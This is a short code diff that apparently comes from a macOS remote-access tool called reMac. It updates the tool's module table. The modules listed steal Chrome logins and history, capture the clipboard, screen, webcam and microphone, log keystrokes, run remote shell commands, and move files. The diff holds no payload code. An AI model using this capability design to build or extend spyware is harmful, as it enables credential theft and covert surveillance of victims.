@@ -19,20 +19,20 @@ from apps.libs.reMac_libbase import reMac_libbase
 
 
 reMacModules = {
-    'hw': [mod_hello.mod_hello(), 'helloworld', 'Call HelloWorld module', 'hw'],
-    'cb': [mod_clipboard.mod_clipboard(), 'clipboard', 'Call clipboard module', 'cb'],
-    'ch': [mod_chrome_history.mod_chrome_history(), 'chromehist', 'Call Chrome-History module', 'ch'],
-    'cl': [mod_chrome_logins.mod_chrome_logins(), 'chromelogin', 'Call Chrome-Logins module', 'cl'],
-    'sh': [mod_shellcmd.mod_shellcmd(), 'shellcmd', 'Call shell command module', 'sh <cmd to send>'],
-    'sc': [mod_screenshot.mod_screenshot(), 'screenshot', 'Call screenshot module', 'sc'],
-    'wc': [mod_webcam.mod_webcam(), 'webcam', 'Call webcam module', 'wc [-t <seconds to warmup>]'],
-    'kl': [mod_keylogger.mod_keylogger(), 'keylogger', 'Call keylogger module (NOT WORKING YET)', 'kl'],
-    'rm': [mod_recmic.mod_recmic(), 'recmic', 'Call record microphone module', 'rm [-t <seconds to record>]'],
-    'mh': [mod_modHelp.mod_modHelp(), 'modHelp', 'Call server modules help module', 'mh <module>'],
-    'in': [mod_info.mod_info(), 'info', 'Call info module', 'in'],
-    'dl': [mod_download.mod_download(), 'download', 'Call download module (to app "/tmp")', 'dl <remote filename>'],
-    'ul': [mod_upload.mod_upload(), 'upload', 'Call upload module (to app "/tmp")', 'ul <local filename>'],
-    'hp': [mod_help.mod_help(), 'help', 'Call help module', 'hp']
+    'hw': [mod_hello.mod_hello(), 'helloworld', 'Call HelloWorld module', 'hw', 'helloworld'],
+    'cb': [mod_clipboard.mod_clipboard(), 'clipboard', 'Call clipboard module', 'cb', 'clipboard'],
+    'ch': [mod_chrome_history.mod_chrome_history(), 'chromehist', 'Call Chrome-History module', 'ch', 'chromechistory'],
+    'cl': [mod_chrome_logins.mod_chrome_logins(), 'chromelogin', 'Call Chrome-Logins module', 'cl', 'chromelogin'],
+    'sh': [mod_shellcmd.mod_shellcmd(), 'shellcmd', 'Call shell command module', 'sh <cmd to send>', 'shellcmd'],
+    'sc': [mod_screenshot.mod_screenshot(), 'screenshot', 'Call screenshot module', 'sc', 'screenshot'],
+    'wc': [mod_webcam.mod_webcam(), 'webcam', 'Call webcam module', 'wc [-t <seconds to warmup>]', 'webcam'],
+    'kl': [mod_keylogger.mod_keylogger(), 'keylogger', 'Call keylogger module (NOT WORKING YET)', 'kl', 'keylogger'],
+    'rm': [mod_recmic.mod_recmic(), 'recmic', 'Call record microphone module', 'rm [-t <seconds to record>]', 'microphone'],
+    'mh': [mod_modHelp.mod_modHelp(), 'modHelp', 'Call server modules help module', 'mh <module>', 'modhelp'],
+    'in': [mod_info.mod_info(), 'info', 'Call info module', 'in', 'info'],
+    'dl': [mod_download.mod_download(), 'download', 'Call download module (to app "/tmp")', 'dl <remote filename>', 'download'],
+    'ul': [mod_upload.mod_upload(), 'upload', 'Call upload module (to app "/tmp")', 'ul <local filename>', 'upload'],
+    'hp': [mod_help.mod_help(), 'help', 'Call help module', 'hp', 'help']
 }
 
 
